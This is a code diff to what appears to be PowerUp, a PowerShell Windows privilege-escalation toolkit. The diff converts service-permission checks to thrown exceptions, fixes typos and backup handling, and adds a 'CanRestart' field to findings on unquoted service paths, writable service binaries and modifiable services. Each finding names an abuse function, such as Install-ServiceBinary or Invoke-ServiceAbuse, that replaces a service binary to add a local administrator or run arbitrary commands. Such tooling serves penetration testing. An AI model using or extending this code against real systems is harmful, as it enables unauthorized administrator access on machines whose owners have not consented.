@@ -122,8 +122,7 @@ function Test-ServiceDaclPermission {
 
     # check if sc.exe exists
     if (-not (Test-Path ("$env:SystemRoot\system32\sc.exe"))){ 
-        Write-Warning "[!] Could not find $env:SystemRoot\system32\sc.exe"
-        return $False
+        throw [System.IO.FileNotFoundException] "$env:SystemRoot\system32\sc.exe not found"
     }
 
     $ServiceAccessFlags = @{
@@ -151,68 +150,60 @@ function Test-ServiceDaclPermission {
     
     # make sure we got a result back
     if (-not ($TargetService)){
-        Write-Warning "[!] Target service '$ServiceName' not found on the machine"
-        return $False
+        throw [System.Management.Instrumentation.InstanceNotFoundException] "Target service '$ServiceName' not found on the machine"
     }
 
-    try {
-        # retrieve DACL from sc.exe
-        $Result = sc.exe sdshow $TargetService.Name | where {$_}
+    # retrieve DACL from sc.exe (only possible if 'RC' DACL is set)
+    $Result = sc.exe sdshow $TargetService.Name | where {$_}
 
-        if ($Result -like "*OpenService FAILED*"){
-                Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                return $False
-        }
+    if ($Result -like "*OpenService FAILED*"){
+        throw [System.Management.Automation.ApplicationFailedException] "Could not retrieve DACL permissions for '$($TargetService.Name)'"
+    }
 
-        $SecurityDescriptors = New-Object System.Security.AccessControl.RawSecurityDescriptor($Result)
+    $SecurityDescriptors = New-Object System.Security.AccessControl.RawSecurityDescriptor($Result)
 
-        # populate a list of group SIDs that the current user is a member of
-        $Sids = whoami /groups /FO csv | ConvertFrom-Csv | select "SID" | ForEach-Object {$_.Sid}
+    # populate a list of group SIDs that the current user is a member of
+    $Sids = whoami /groups /FO csv | ConvertFrom-Csv | select "SID" | ForEach-Object {$_.Sid}
 
-        # add to the list the SID of the current user
-        $Sids += [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value
+    # add to the list the SID of the current user
+    $Sids += [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value
 
-        ForEach ($Sid in $Sids){
-            ForEach ($Ace in $SecurityDescriptors.DiscretionaryAcl){   
+    ForEach ($Sid in $Sids){
+        ForEach ($Ace in $SecurityDescriptors.DiscretionaryAcl){   
+        
+            # check if the group/user SID is included in the ACE 
+            if ($Sid -eq $Ace.SecurityIdentifier){
+                
+                # convert the AccessMask to a service DACL string
+                $DaclString = $($ServiceAccessFlags.Keys | Foreach-Object {
+                    if (($ServiceAccessFlags[$_] -band $Ace.AccessMask) -eq $ServiceAccessFlags[$_]) {
+                        $_
+                    }
+                }) -join ""
             
-                # check if the group/user SID is included in the ACE 
-                if ($Sid -eq $Ace.SecurityIdentifier){
-                    
-                    # convert the AccessMask to a service DACL string
-                    $DaclString = $($ServiceAccessFlags.Keys | Foreach-Object {
-                        if (($ServiceAccessFlags[$_] -band $Ace.AccessMask) -eq $ServiceAccessFlags[$_]) {
-                            $_
-                        }
-                    }) -join ""
-                
-                    # convert the input DACL to an array
-                    $DaclArray = [array] ($Dacl -split '(.{2})' | Where-Object {$_})
-                
-                    # counter to check how many DACL permissions were found
-                    $MatchedPermissions = 0
-                
-                    # check if each of the permissions exists
-                    ForEach ($DaclPermission in $DaclArray){
-                        if ($DaclString.Contains($DaclPermission.ToUpper())){
-                            $MatchedPermissions += 1
-                        }
-                        else{
-                            break
-                        }
+                # convert the input DACL to an array
+                $DaclArray = [array] ($Dacl -split '(.{2})' | Where-Object {$_})
+            
+                # counter to check how many DACL permissions were found
+                $MatchedPermissions = 0
+            
+                # check if each of the permissions exists
+                ForEach ($DaclPermission in $DaclArray){
+                    if ($DaclString.Contains($DaclPermission.ToUpper())){
+                        $MatchedPermissions += 1
                     }
-                    # found all permissions - success
-                    if ($MatchedPermissions -eq $DaclArray.Count){
-                        return $True
+                    else{
+                        break
                     }
-                }  
-            }
+                }
+                # found all permissions - success
+                if ($MatchedPermissions -eq $DaclArray.Count){
+                    return $True
+                }
+            }  
         }
-        return $False
     }
-    catch{
-        Write-Warning "Error: $_"
-        return $False
-    }
+    return $False
 }
 
 function Invoke-ServiceStart {
@@ -369,7 +360,7 @@ function Invoke-ServiceEnable {
         
         try {
             # enable the service
-            Write-Verbose "Enabling service '$TargetService.Name'"
+            Write-Verbose "Enabling service '$($TargetService.Name)'"
             $Null = sc.exe config "$($TargetService.Name)" start= demand
             return $True
         }
@@ -417,7 +408,7 @@ function Invoke-ServiceDisable {
         
         try {
             # disable the service
-            Write-Verbose "Disabling service '$TargetService.Name'"
+            Write-Verbose "Disabling service '$($TargetService.Name)'"
             $Null = sc.exe config "$($TargetService.Name)" start= disabled
             return $True
         }
@@ -458,11 +449,17 @@ function Get-ServiceUnquoted {
     
     if ($VulnServices) {
         ForEach ($Service in $VulnServices){
+            try {
+                $CanRestart = Test-ServiceDaclPermission -ServiceName $Service.name -Dacl 'WPRP'
+            } catch {
+                $CanRestart = "Cannot be determined through DACL, try manually."
+            }
             $Out = New-Object PSObject 
             $Out | Add-Member Noteproperty 'ServiceName' $Service.name
             $Out | Add-Member Noteproperty 'Path' $Service.pathname
             $Out | Add-Member Noteproperty 'StartName' $Service.startname
             $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -ServiceName '$($Service.name)' -Path <HijackPath>"
+            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
             $Out
         }
     }
@@ -492,12 +489,18 @@ function Get-ServiceFilePermission {
         $ServiceStartName = $_.startname
 
         $ServicePath | Get-ModifiableFile | ForEach-Object {
+            try {
+                $CanRestart = Test-ServiceDaclPermission -ServiceName $ServiceName -Dacl 'WPRP'
+            } catch {
+                $CanRestart = "Cannot be determined through DACL, try manually."
+            }
             $Out = New-Object PSObject 
             $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
             $Out | Add-Member Noteproperty 'Path' $ServicePath
             $Out | Add-Member Noteproperty 'ModifiableFile' $_
             $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
             $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -ServiceName '$ServiceName'"
+            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
             $Out
         }
     }
@@ -510,7 +513,7 @@ function Get-ServicePermission {
 
         This function enumerates all available services and tries to
         open the service for modification, returning the service object
-        if the process doesn't failed.
+        if the process didn't fail.
     
     .EXAMPLE
 
@@ -541,11 +544,17 @@ function Get-ServicePermission {
 
             # means the change was successful
             if ($Result -contains "[SC] ChangeServiceConfig SUCCESS"){
+                try {
+                    $CanRestart = Test-ServiceDaclPermission -ServiceName $Service.name -Dacl 'WPRP'
+                } catch {
+                    $CanRestart = "Cannot be determined through DACL, try manually."
+                }
                 $Out = New-Object PSObject 
                 $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                 $Out | Add-Member Noteproperty 'Path' $Service.pathname
                 $Out | Add-Member Noteproperty 'StartName' $Service.startname
                 $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -ServiceName '$($Service.name)'"
+                $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
                 $Out
             }
         }
@@ -794,7 +803,7 @@ function Write-ServiceBinary {
 
         The service name the EXE will be running under. Required.
 
-    .PARAMETER Path
+    .PARAMETER ServicePath
 
         Path to write the binary out to, defaults to the local directory.
 
@@ -920,7 +929,7 @@ function Install-ServiceBinary {
 <#
     .SYNOPSIS
 
-        Users Write-ServiceBinary to write a C# service that creates a local UserName
+        Uses Write-ServiceBinary to write a C# service that creates a local UserName
         and adds it to specified LocalGroup or executes a custom command.
         Domain users are only added to the specified LocalGroup.
 
@@ -1006,7 +1015,7 @@ function Install-ServiceBinary {
 
                 Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
                 try {
-                    Move-Item -Path $ServicePath -Destination $BackupPath -Force
+                    Copy-Item -Path $ServicePath -Destination $BackupPath -Force
                 }
                 catch {
                     Write-Warning "[*] Original path '$ServicePath' for '$ServiceName' does not exist!"
